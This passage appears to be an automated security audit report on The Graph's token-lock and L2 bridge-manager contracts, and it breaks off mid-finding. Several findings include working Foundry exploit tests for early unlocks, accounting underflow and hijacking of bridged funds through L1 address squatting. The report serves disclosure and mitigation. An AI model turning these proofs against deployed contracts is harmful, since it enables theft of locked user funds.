contract PeriodRoundingEarlyReleasePoC is Test {
    function testRoundedPeriodDurationUnlocksBeforeEndTime() public {
        address beneficiary = address(uint160(0xBEEF));
        MockGRT2 token = new MockGRT2();
        GraphTokenLockWallet implementation = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(implementation));
        GraphTokenLockWallet wallet = new GraphTokenLockWallet();
        uint256 start = 1000;
        uint256 end = 1100;
        uint256 amount = 600 ether;
        wallet.initialize(address(manager), address(this), beneficiary, address(token), amount, start, end, 60, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(wallet), amount);
        vm.warp(start + 60);
        assertLt(block.timestamp, end);
        assertEq(wallet.releasableAmount(), amount);
        vm.prank(beneficiary);
        wallet.release();
        assertEq(token.balanceOf(beneficiary), amount);
        assertEq(token.balanceOf(address(wallet)), 0);
    }
}


## Suggested Mitigation
Validate periods <= duration and compute elapsed periods with multiplication before division: passed = MathUtils.min(periods, sinceStartTime().mul(periods).div(duration())). Then available = passed.mul(managedAmount).div(periods), capped to managedAmount. Also reject configurations where duration / periods would be zero.


## [H-122]. Rounded period duration unlocks all managed GRT before endTime

## id: 2yrAtCL-ES-15uAfRlAEc

## Derived From Pattern/Invariant
PricePrecisionOrRoundingError

## Exploit Type
RoundingError

## Location
GraphTokenLock.availableAmount

## Finding Status: Valid
### Finding Status Justification: periodDuration is duration / periods rounded down, passedPeriods is derived from that rounded duration, and availableAmount does not cap passedPeriods to periods. The example schedule reaches all periods before endTime, making the full amount releasable. This is in scoped production code and is not fully prevented by any guard.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
The release schedule floors both periodDuration and amountPerPeriod, then multiplies passed periods without capping passedPeriods to periods. Vulnerable snippet: `periodDuration() = duration().div(periods)`, `passedPeriods() = currentPeriod().sub(MIN_PERIOD)`, and `availableAmount() = passedPeriods().mul(amountPerPeriod())`. When duration is not aligned with periods, passedPeriods can reach periods before endTime, making the full managedAmount available early; after that it can exceed managedAmount if amountPerPeriod does not round down enough and surplus balance exists.

## Impact
A beneficiary can release locked GRT earlier than the configured endTime for schedules accepted by the contracts, breaking the lock/maturity invariant and potentially depriving the lock owner or protocol of revocable/unvested GRT.

## Proof of Concept
1. A lock is initialized with startTime=100, endTime=200, periods=60, and managedAmount=60 ether. 2. periodDuration is floor(100/60)=1 second. 3. At timestamp 160, currentTime is still 40 seconds before endTime, but passedPeriods is already 60. 4. availableAmount returns the full 60 ether and the beneficiary can call release before maturity.

## Proof of Code
pragma solidity 0.7.6;
pragma experimental ABIEncoderV2;
import 'forge-std/Test.sol';
import '../contracts/GraphTokenLockWallet.sol';
import '../contracts/IGraphTokenLock.sol';
contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 a) external { balanceOf[to]+=a; } function transfer(address to,uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a,'bal'); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; } function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; } function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a,'bal'); require(allowance[f][msg.sender]>=a,'allow'); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } }
contract EarlyUnlockPoC is Test { function testRoundedPeriodDurationUnlocksBeforeEndTime() public { address beneficiary = address(0xBEEF); MockToken token = new MockToken(); GraphTokenLockWallet wallet = new GraphTokenLockWallet(); wallet.initialize(address(this), address(this), beneficiary, address(token), 60 ether, 100, 200, 60, 0, 0, IGraphTokenLock.Revocability.Enabled); token.mint(address(wallet), 60 ether); vm.warp(160); assertLt(block.timestamp, wallet.endTime()); assertEq(wallet.availableAmount(), 60 ether); vm.prank(beneficiary); wallet.release(); assertEq(token.balanceOf(beneficiary), 60 ether); } }

## Suggested Mitigation
Calculate vested amount as `managedAmount * elapsed / duration` with bounds, or cap passed periods to `periods` and require schedules whose period duration and amount-per-period math cannot unlock the full amount before endTime. Treat `currentTime >= endTime` as fully unlocked and all earlier times as strictly less than managedAmount.


## [M-123]. Release after revoke can overcount surplus as scheduled GRT and underflow outstanding accounting

## id: ilToR6Ub4dn4RnDMJlOtI

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.release

## Finding Status: Valid
### Finding Status Justification: releasableAmount ignores revokedAmount and returns min(currentBalance, availableAmount - releasedAmount). After revoke, a direct surplus transfer can let release count surplus as scheduled principal and push releasedAmount + revokedAmount above managedAmount. totalOutstandingAmount then underflows. This is a current production-code path with no complete cap or separation of surplus from scheduled release.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
After revoke(), the contract records revokedAmount but release() still computes releasable tokens as `availableAmount().sub(releasedAmount)` and caps only by currentBalance(), not by `managedAmount - releasedAmount - revokedAmount`. If surplus tokens are later transferred into the wallet, release() can count those surplus tokens as scheduled tokens, making `releasedAmount + revokedAmount > managedAmount`. Subsequent `totalOutstandingAmount()` and `surplusAmount()` can underflow and revert. Vulnerable snippet: `uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable);` and `return managedAmount.sub(releasedAmount).sub(revokedAmount);`.

## Impact
The lock accounting invariant `releasedAmount + revokedAmount <= managedAmount` can be broken. This can misclassify surplus as scheduled release, corrupt lifetime accounting, and permanently break outstanding/surplus queries after a revoke plus later token transfer.

## Proof of Concept
1. Create a revocable lock for 100 GRT. 2. At 40% vested, the owner revokes, setting revokedAmount=60 and leaving 40 GRT in the wallet. 3. Anyone transfers 60 extra GRT to the wallet. 4. After endTime, availableAmount() is 100 and release() transfers the full 100 balance to the beneficiary. 5. releasedAmount=100 and revokedAmount=60, so totalOutstandingAmount() underflows.

## Proof of Code
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockSimple.sol";
contract MockGRT is ERC20 { constructor() ERC20("GRT","GRT") { _mint(msg.sender, 1e30); } }
contract RevokeSurplusAccountingTest is Test { function testSurplusCanBreakReleasedPlusRevokedInvariant() public { MockGRT token = new MockGRT(); GraphTokenLockSimple lock = new GraphTokenLockSimple(); address owner = address(0xABCD); address beneficiary = address(0xBEEF); lock.initialize(owner, beneficiary, address(token), 100 ether, 100, 200, 10, 0, 0, IGraphTokenLock.Revocability.Enabled); token.transfer(address(lock), 100 ether); vm.warp(140); vm.prank(owner); lock.revoke(); assertEq(lock.revokedAmount(), 60 ether); token.transfer(address(lock), 60 ether); vm.warp(201); vm.prank(beneficiary); lock.release(); assertEq(lock.releasedAmount(), 100 ether); assertGt(lock.releasedAmount() + lock.revokedAmount(), lock.managedAmount()); vm.expectRevert(); lock.totalOutstandingAmount(); } }

## Suggested Mitigation
Compute releasableAmount as the minimum of currentBalance, availableAmount - releasedAmount, and managedAmount - releasedAmount - revokedAmount. Keep surplus accounting separate from scheduled release accounting after revocation.


## [M-124]. Floored period duration can unlock the full lock balance before endTime

## id: lngDuit-0EI66fFHVws3t

## Derived From Pattern/Invariant
MaturityorGatingByPass / DivideByZeroOrOverFlowInCustomMath

## Exploit Type
IntegerMath

## Location
GraphTokenLock.release

## Finding Status: Valid
### Finding Status Justification: periodDuration floors duration / periods, currentPeriod divides elapsed time by that floored value, and passedPeriods is not capped. For non-divisible schedules, periods * periodDuration can be less than duration, making availableAmount reach the full managed amount before endTime. A beneficiary can then call release. No code safeguard caps availability to the intended end timestamp.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The release schedule computes `periodDuration()` as `duration().div(periods)` and then computes passed periods as `sinceStartTime().div(periodDuration())`. Because `periodDuration` is rounded down, `periods * periodDuration` can be materially less than `duration`. Once `passedPeriods() * amountPerPeriod()` reaches managedAmount, the beneficiary can release the full wallet balance while `block.timestamp < endTime`. The relevant snippets are `periodDuration() { return duration().div(periods); }`, `currentPeriod() { return sinceStartTime().div(periodDuration()).add(1); }`, and `availableAmount() { return passedPeriods().mul(amountPerPeriod()); }`.

## Impact
A beneficiary of a misrounded schedule can withdraw locked GRT before the configured endTime, bypassing the intended maturity gate. For large distribution wallets this prematurely releases funds that should remain locked under the vesting schedule.

## Proof of Concept
1. A lock is created with startTime=1000, endTime=2000, periods=501, and managedAmount=501 ether.
2. duration is 1000 seconds, but periodDuration floors to 1 second.
3. At timestamp 1501, which is 499 seconds before endTime, passedPeriods() returns 501.
4. availableAmount() returns the full managedAmount.
5. The beneficiary calls release() and receives the entire locked balance before maturity.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../contracts/GraphTokenLockManager.sol";
import "../contracts/GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";

contract MockGRT is ERC20 {
    constructor() public ERC20("GRT", "GRT") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract EarlyUnlockRoundingPoC is Test {
    function testFullReleaseBeforeEndTimeDueToFlooredPeriodDuration() public {
        MockGRT token = new MockGRT();
        GraphTokenLockWallet master = new GraphTokenLockWallet();
        GraphTokenLockManager manager = new GraphTokenLockManager(IERC20(address(token)), address(master));

        address owner = address(this);
        address beneficiary = address(0xBEEF);
        uint256 amount = 501 ether;
        uint256 start = 1000;
        uint256 end = 2000;
        uint256 periods = 501;

        token.mint(address(manager), amount);
        bytes memory initializer = abi.encodeWithSelector(
            GraphTokenLockWallet.initialize.selector,
            address(manager), owner, beneficiary, address(token), amount,
            start, end, periods, uint256(0), uint256(0), IGraphTokenLock.Revocability.Disabled
        );
        address wallet = manager.getDeploymentAddress(keccak256(initializer), address(master));
        manager.createTokenLockWallet(owner, beneficiary, amount, start, end, periods, 0, 0, IGraphTokenLock.Revocability.Disabled);

        vm.warp(1501);
        assertLt(block.timestamp, end);

        vm.prank(beneficiary);
        GraphTokenLockWallet(wallet).release();

        assertEq(token.balanceOf(beneficiary), amount);
        assertEq(token.balanceOf(wallet), 0);
    }
}

## Suggested Mitigation
Validate schedules so `duration >= periods` and avoid using a floored period length as a divisor. Compute passed periods as `min(periods, sinceStartTime() * periods / duration())`, return full managedAmount only when `currentTime() >= endTime`, and add tests for non-divisible duration/period combinations.


## [M-125]. Surplus tokens can be counted as scheduled releases and make totalOutstandingAmount underflow

## id: cWVy3mtuEgtyKiYnTckyD

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.release

## Finding Status: Valid
### Finding Status Justification: The root cause exists because availableAmount() can exceed managedAmount when periodDuration floors down and passedPeriods is uncapped, while releasableAmount() caps only by currentBalance() and availableAmount() - releasedAmount. If the wallet has surplus, release() can push releasedAmount above managedAmount, causing totalOutstandingAmount() and surplusAmount() to underflow. No cap by managedAmount - releasedAmount is present. The code is in-scope. Surplus deposits are supported and release is a beneficiary action, so this is not merely user mistake, privileged abuse, or future speculation.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
releasableAmount() caps by currentBalance() and availableAmount() - releasedAmount, but it does not cap releases by managedAmount - releasedAmount. Because availableAmount() can exceed managedAmount before endTime when periodDuration floors down, surplus tokens held by the wallet can be released and recorded as managed-token releases. Vulnerable snippet: uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable); releasedAmount = releasedAmount.add(amountToRelease).

## Impact
A beneficiary can push releasedAmount above managedAmount when the wallet holds surplus GRT, causing totalOutstandingAmount() and surplusAmount() to revert from SafeMath underflow and corrupting the wallet accounting invariant.

## Proof of Concept
1. Initialize a wallet with managedAmount = 30, duration = 100 seconds, and periods = 30. 2. Send 35 tokens to the wallet, so 5 are surplus. 3. At timestamp startTime + 99, availableAmount() is 33 because periodDuration() is 3 and passedPeriods() is 33. 4. The beneficiary calls release(), receives 33 tokens, and releasedAmount becomes 33 > managedAmount. 5. totalOutstandingAmount() reverts forever until state is otherwise changed because managedAmount - releasedAmount underflows.

## Proof of Code
pragma solidity >=0.7.3 <0.9.0; import {Test} from 'forge-std/Test.sol'; import {GraphTokenLockWallet} from '../contracts/GraphTokenLockWallet.sol'; import {IGraphTokenLock} from '../contracts/IGraphTokenLock.sol'; contract MockToken { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 a) external { balanceOf[to]+=a; } function transfer(address to,uint256 a) external returns(bool){ require(balanceOf[msg.sender]>=a,'bal'); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; } function approve(address s,uint256 a) external returns(bool){ allowance[msg.sender][s]=a; return true; } function transferFrom(address f,address t,uint256 a) external returns(bool){ require(balanceOf[f]>=a,'bal'); require(allowance[f][msg.sender]>=a,'allow'); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; } } contract MockManager { function getTokenDestinations() external pure returns(address[] memory a){ a=new address[](0); } function getAuthFunctionCallTarget(bytes4) external pure returns(address){ return address(0); } } contract SurplusReleasePoC is Test { function test_releaseCanExceedManagedAmountWithSurplus() external { MockToken token=new MockToken(); MockManager manager=new MockManager(); GraphTokenLockWallet wallet=new GraphTokenLockWallet(); address ben=address(0xBEEF); wallet.initialize(address(manager),address(this),ben,address(token),30,1000,1100,30,0,0,IGraphTokenLock.Revocability.Disabled); token.mint(address(wallet),35); vm.warp(1099); assertGt(wallet.availableAmount(),wallet.managedAmount()); vm.prank(ben); wallet.release(); assertGt(wallet.releasedAmount(),wallet.managedAmount()); vm.expectRevert(); wallet.totalOutstandingAmount(); } }

## Suggested Mitigation
In releasableAmount(), cap the computed releasable amount by managedAmount - releasedAmount and cap availableAmount() itself to managedAmount. Surplus withdrawals should remain separate from scheduled managed-token releases.


## [H-126]. Non-divisible vesting periods let GraphTokenLock.release account and transfer more than managedAmount at endTime

## id: dADqX6pseO-paTjLOPfd4

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.release

## Finding Status: Valid
### Finding Status Justification: The endTime boundary bug exists. availableAmount returns managedAmount only when currentTime > endTime, not when currentTime == endTime. At exactly endTime it still uses passedPeriods * amountPerPeriod. Because periodDuration is floor(duration / periods), passedPeriods can exceed periods at endTime for non-divisible schedules, making availableAmount exceed managedAmount. release then caps only by currentBalance, so surplus tokens in the wallet can be transferred and recorded as releasedAmount, corrupting totalOutstandingAmount. No complete safeguard caps availableAmount or elapsed periods. The affected source is in scope and not explicitly by design. A beneficiary can exploit through normal release if the wallet has surplus, without privileged compromise or a pure user mistake. The issue exists now.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
availableAmount() only returns managedAmount when currentTime() > endTime. At exactly endTime it still uses passedPeriods() * amountPerPeriod(). Because periodDuration() is floor-rounded as duration() / periods, if duration is not divisible by periods then passedPeriods() can exceed periods at endTime, making availableAmount() exceed managedAmount. Vulnerable snippet: periodDuration() returns duration().div(periods); currentPeriod() returns sinceStartTime().div(periodDuration()).add(MIN_PERIOD); availableAmount() uses if (current > endTime) return managedAmount; otherwise return passedPeriods().mul(amountPerPeriod()). release() then adds that amount to releasedAmount before transferring, so releasedAmount can become greater than managedAmount when the lock holds surplus tokens.

## Impact
A beneficiary can withdraw surplus tokens through release() as if they were scheduled managed funds and corrupt lifetime accounting. After releasedAmount > managedAmount, totalOutstandingAmount() underflows, which can brick surplus accounting and revoke/withdraw flows. If many or high-value locked wallets contain donated, migrated, or protocol-transferred surplus, this can cause direct loss of those tokens from the lock wallet to the beneficiary.

## Proof of Concept
1. A lock is initialized with startTime=1000, endTime=1010, periods=6, managedAmount=600 ether. 2. The lock receives the 600 managed tokens plus 400 surplus tokens. 3. At block.timestamp == endTime, periodDuration() is 1 and passedPeriods() is 10, so availableAmount() returns 1000 instead of 600. 4. The beneficiary calls release(). 5. releasedAmount becomes 1000 and the beneficiary receives all 1000 tokens. 6. totalOutstandingAmount() now reverts because managedAmount - releasedAmount underflows.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;

import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";

contract MockERC20 {
    string public name = "Mock";
    string public symbol = "MOCK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, "bal"); require(allowance[from][msg.sender] >= amount, "allow"); allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract GraphTokenLockEndTimeOverReleasePoC is Test {
    function test_releaseCanExceedManagedAmountAtEndTime() public {
        address owner = address(0xA11CE);
        address beneficiary = address(0xB0B);
        MockERC20 token = new MockERC20();
        GraphTokenLockSimple lock = new GraphTokenLockSimple();

        vm.prank(owner);
        lock.initialize(owner, beneficiary, address(token), 600 ether, 1000, 1010, 6, 0, 0, IGraphTokenLock.Revocability.Disabled);
        token.mint(address(lock), 1000 ether);

        vm.warp(1010);
        assertGt(lock.availableAmount(), lock.managedAmount());
        vm.prank(beneficiary);
        lock.release();

        assertEq(token.balanceOf(beneficiary), 1000 ether);
        assertGt(lock.releasedAmount(), lock.managedAmount());
        vm.expectRevert();
        lock.totalOutstandingAmount();
    }
}

## Suggested Mitigation
Treat endTime as fully vested by changing availableAmount() to return managedAmount when current >= endTime. Also cap schedule math to managedAmount, for example return MathUtils.min(managedAmount, passedPeriods().mul(amountPerPeriod())), and require duration() >= periods during initialization.


## [C-127]. L1 wallet key squatting in L2GraphTokenLockManager.onTokenTransfer redirects later bridged lock funds

## id: tVCBeXMEBH5V6SCGf3URD

## Derived From Pattern/Invariant
ExternalProtocolKeyCollision

## Exploit Type
ExternalProtocolKeyCollision

## Location
L2GraphTokenLockManager.onTokenTransfer

## Finding Status: Valid
### Finding Status Justification: L2GraphTokenLockManager.onTokenTransfer keys l1WalletToL2Wallet only by walletData.l1Address. Once set, later transfers for the same l1Address are sent to the existing L2 wallet without comparing owner, beneficiary, managedAmount, or data hash. onlyL2Gateway and _from == l1TransferTool authenticate the bridge path, but do not bind later wallet data to the original. The file is in scope and no complete safeguard is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The L2 manager keys received wallets only by the externally supplied walletData.l1Address. The first message for a given l1Address permanently binds that key to the newly deployed L2 wallet, and all later messages for the same l1Address transfer tokens to the existing wallet without checking that the later wallet data matches the original owner, beneficiary, managedAmount, or initializer hash.

Vulnerable snippet:
if (l1WalletToL2Wallet[walletData.l1Address] != address(0)) {
    _token.safeTransfer(l1WalletToL2Wallet[walletData.l1Address], _amount);
} else {
    (bytes32 initHash, address contractAddress) = _deployFromL1(keccak256(_data), walletData);
    l1WalletToL2Wallet[walletData.l1Address] = contractAddress;
    l2WalletToL1Wallet[contractAddress] = walletData.l1Address;
    _token.safeTransfer(contractAddress, _amount);
}

A sender able to originate an L1 transfer-tool message can front-run or preempt a victim L1 wallet address by sending a tiny transfer with walletData.l1Address set to the victim but owner/beneficiary set to the attacker. Later legitimate transfers for that L1 wallet are routed to the attacker-controlled L2 wallet. If the attacker chose a tiny managedAmount, the victim's later bridged amount is immediately surplus in the attacker's wallet.

## Impact
Victim locked GRT bridged for the same L1 wallet identity can be redirected to an attacker-controlled L2 lock wallet and withdrawn as surplus, causing direct loss of user funds from protocol smart contracts when large lock transfers are affected.

## Proof of Concept
1. Attacker computes or observes a victim L1 lock wallet address that is expected to bridge to L2.
2. Attacker sends a small L1 transfer-tool message whose encoded TransferredWalletData uses victimL1 as l1Address but sets owner and beneficiary to attacker and managedAmount to 1 token.
3. L2GraphTokenLockManager creates an attacker-controlled L2 wallet and records l1WalletToL2Wallet[victimL1] = attackerWallet.
4. The victim later bridges the real locked amount with the same l1Address.
5. onTokenTransfer sees the existing mapping and transfers the victim amount to attackerWallet, ignoring the victim's owner/beneficiary/managedAmount data.
6. Because attackerWallet only has 1 token of outstanding managed amount, the victim amount is surplus and the attacker withdraws it immediately.

## Proof of Code
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import 'forge-std/Test.sol';
import '@openzeppelin/contracts/token/ERC20/IERC20.sol';
import '../contracts/L2GraphTokenLockManager.sol';
import '../contracts/L2GraphTokenLockWallet.sol';

contract MockGRT {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, 'bal'); balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true; }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { require(balanceOf[from] >= amount, 'bal'); require(allowance[from][msg.sender] >= amount, 'allow'); if (allowance[from][msg.sender] != type(uint256).max) allowance[from][msg.sender] -= amount; balanceOf[from] -= amount; balanceOf[to] += amount; return true; }
}

contract L2KeySquatPoC is Test {
    MockGRT token;
    L2GraphTokenLockWallet master;
    L2GraphTokenLockManager manager;
    address l1Tool = address(0x1000);
    address victimL1 = address(0xBEEF);
    address victim = address(0xCAFE);
    address attacker = address(0xA11CE);

    function setUp() public {
        token = new MockGRT();
        master = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(master), address(this), l1Tool);
    }

    function testL1AddressSquattingStealsLaterBridgeTransfer() public {
        token.mint(address(manager), 1 ether);
        L2GraphTokenLockManager.TransferredWalletData memory poison = L2GraphTokenLockManager.TransferredWalletData(victimL1, attacker, attacker, 1 ether, block.timestamp, block.timestamp + 365 days);
        manager.onTokenTransfer(l1Tool, 1 ether, abi.encode(poison));
        address attackerWallet = manager.l1WalletToL2Wallet(victimL1);
        assertEq(L2GraphTokenLockWallet(attackerWallet).beneficiary(), attacker);

        token.mint(address(manager), 1000000 ether);
        L2GraphTokenLockManager.TransferredWalletData memory legitimate = L2GraphTokenLockManager.TransferredWalletData(victimL1, victim, victim, 1000000 ether, block.timestamp, block.timestamp + 365 days);
        manager.onTokenTransfer(l1Tool, 1000000 ether, abi.encode(legitimate));

        assertEq(token.balanceOf(attackerWallet), 1000001 ether);
        vm.prank(attacker);
        L2GraphTokenLockWallet(attackerWallet).withdrawSurplus(1000000 ether);
        assertEq(token.balanceOf(attacker), 1000000 ether);
    }
}


## Suggested Mitigation
Bind each l1Address to an immutable hash of the canonical wallet data and require every later transfer for that l1Address to match it. Reject first transfers where _amount does not equal walletData.managedAmount unless partial funding is explicitly designed and tracked. Prefer authenticating that walletData.l1Address is the actual L1 lock wallet being transferred in the L1 transfer tool and include that authenticated source in the L2 mapping key.


## [H-128]. L2GraphTokenLockManager.onTokenTransfer lets bridged top-ups become pre-vesting surplus withdrawals

## id: gDOfk3hDkW8rDnfKAsSqF

## Derived From Pattern/Invariant
AccountingInvariantViolation / MaturityorGatingByPass: additional locked-token receipts must not become withdrawable surplus before endTime

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphTokenLockManager.onTokenTransfer

## Finding Status: Valid
### Finding Status Justification: The existing-wallet branch of onTokenTransfer transfers _amount to l1WalletToL2Wallet[walletData.l1Address] without updating managedAmount or any other locked liability. GraphTokenLock.surplusAmount treats balance above totalOutstandingAmount as surplus, and withdrawSurplus is callable by the beneficiary without waiting for releaseStartTime. Thus a later receipt to an already-created wallet can increase currentBalance while outstanding remains unchanged, making the added amount immediately withdrawable. The gateway/source checks authenticate the bridge path but do not bind the received amount to locked accounting.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The L2 manager forwards every authenticated bridge receipt to the L2 lock wallet but never binds the received amount to the wallet's locked liability. On first creation it initializes managedAmount from walletData.managedAmount, then transfers the arbitrary _amount. On later receipts for the same l1Address it only transfers _amount to the existing wallet and does not increase managedAmount or any other outstanding-liability field. Vulnerable snippets: `if (l1WalletToL2Wallet[walletData.l1Address] != address(0)) { _token.safeTransfer(l1WalletToL2Wallet[walletData.l1Address], _amount); } else { ... walletData.managedAmount ... _token.safeTransfer(contractAddress, _amount); }`. GraphTokenLock.surplusAmount() treats `currentBalance() - totalOutstandingAmount()` as withdrawable by the beneficiary at any time, so a fully funded transferred lock receiving any additional locked-token bridge receipt immediately exposes that receipt as surplus even while release() is still blocked until endTime.

## Impact
A beneficiary can prematurely withdraw bridged locked GRT before the vesting end by making a second/top-up transfer for an already-created L1 wallet, or by creating the wallet with _amount greater than managedAmount. For large transferred locks this bypasses the L1/L2 lock preservation invariant and can directly release significant locked GRT from the L2 wallet contract ahead of schedule.

## Proof of Concept
1. A beneficiary transfers an L1 locked wallet to L2 with managedAmount M and amount M, creating a fully funded L2GraphTokenLockWallet whose releaseStartTime is the future endTime. 2. Before endTime, the same L1 wallet receives or sends an additional authenticated locked-token bridge receipt of amount T. 3. L2GraphTokenLockManager sees l1WalletToL2Wallet[l1Address] already set and only transfers T to the existing wallet. 4. managedAmount and totalOutstandingAmount remain M, while currentBalance becomes M + T. 5. surplusAmount() returns T and withdrawSurplus(T) succeeds for the beneficiary even though releasableAmount() is still zero.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../contracts/L2GraphTokenLockManager.sol";
import "../contracts/L2GraphTokenLockWallet.sol";
import "../contracts/IGraphTokenLock.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockGRT is IERC20 {
    string public name = "Mock GRT";
    string public symbol = "GRT";
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        allowance[from][msg.sender] -= amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract L2TopUpSurplusPoC is Test {
    MockGRT token;
    L2GraphTokenLockWallet masterCopy;
    L2GraphTokenLockManager manager;
    address l2Gateway = address(0x1000);
    address l1TransferTool = address(0x2000);
    address l1Wallet = address(0x3000);
    address owner = address(0x4000);
    address beneficiary = address(0x5000);

    function setUp() public {
        token = new MockGRT();
        masterCopy = new L2GraphTokenLockWallet();
        manager = new L2GraphTokenLockManager(IERC20(address(token)), address(masterCopy), l2Gateway, l1TransferTool);
    }

    function _walletData(uint256 managed, uint256 start, uint256 end) internal view returns (bytes memory) {
        L2GraphTokenLockManager.TransferredWalletData memory d = L2GraphTokenLockManager.TransferredWalletData({
            l1Address: l1Wallet,
            owner: owner,
            beneficiary: beneficiary,
            managedAmount: managed,
            startTime: start,
            endTime: end
        });
        return abi.encode(d);
    }

    function testSecondLockedReceiptBecomesImmediateSurplus() public {
        uint256 managed = 1_000_000 ether;
        uint256 topUp = 250_000 ether;
        uint256 start = block.timestamp;
        uint256 end = block.timestamp + 365 days;
        bytes memory data = _walletData(managed, start, end);

        token.mint(address(manager), managed);
        vm.prank(l2Gateway);
        manager.onTokenTransfer(l1TransferTool, managed, data);

        address wallet = manager.l1WalletToL2Wallet(l1Wallet);
        assertEq(token.balanceOf(wallet), managed);
        assertEq(IGraphTokenLock(wallet).releasableAmount(), 0);

        vm.warp(block.timestamp + 1 days);
        token.mint(address(manager), topUp);
        vm.prank(l2Gateway);
        manager.onTokenTransfer(l1TransferTool, topUp, data);

        assertEq(token.balanceOf(wallet), managed + topUp);
        assertEq(IGraphTokenLock(wallet).totalOutstandingAmount(), managed);
        assertEq(IGraphTokenLock(wallet).surplusAmount(), topUp);
        assertEq(IGraphTokenLock(wallet).releasableAmount(), 0);

        uint256 beforeBalance = token.balanceOf(beneficiary);
        vm.prank(beneficiary);
        IGraphTokenLock(wallet).withdrawSurplus(topUp);
        assertEq(token.balanceOf(beneficiary), beforeBalance + topUp);
        assertEq(token.balanceOf(wallet), managed);
    }
}


## Suggested Mitigation
In onTokenTransfer, bind bridged locked receipts to locked accounting. For first creation require _amount == walletData.managedAmount, or initialize managedAmount from the actually bridged amount if that is the intended source of truth. For later receipts, either reject additional receipts before endTime or add an authenticated top-up path in L2GraphTokenLockWallet that increases managedAmount/locked liability by _amount before transferring tokens. Do not let bridge receipts increase surplusAmount unless the message explicitly authenticates surplus semantics.


## [M-129]. Overfunded first L1 receipt creates immediate surplus in L2GraphTokenLockManager.onTokenTransfer

## id: Np7jVa0FkXPAmRDrKn-RO

## Derived From Pattern/Invariant
AccountingInvariantViolation: first credited token amount should not create immediate surplus

## Exploit Type
AccountingInvariantViolation

## Location
L2GraphTokenLockManager.onTokenTransfer

## Finding Status: Valid
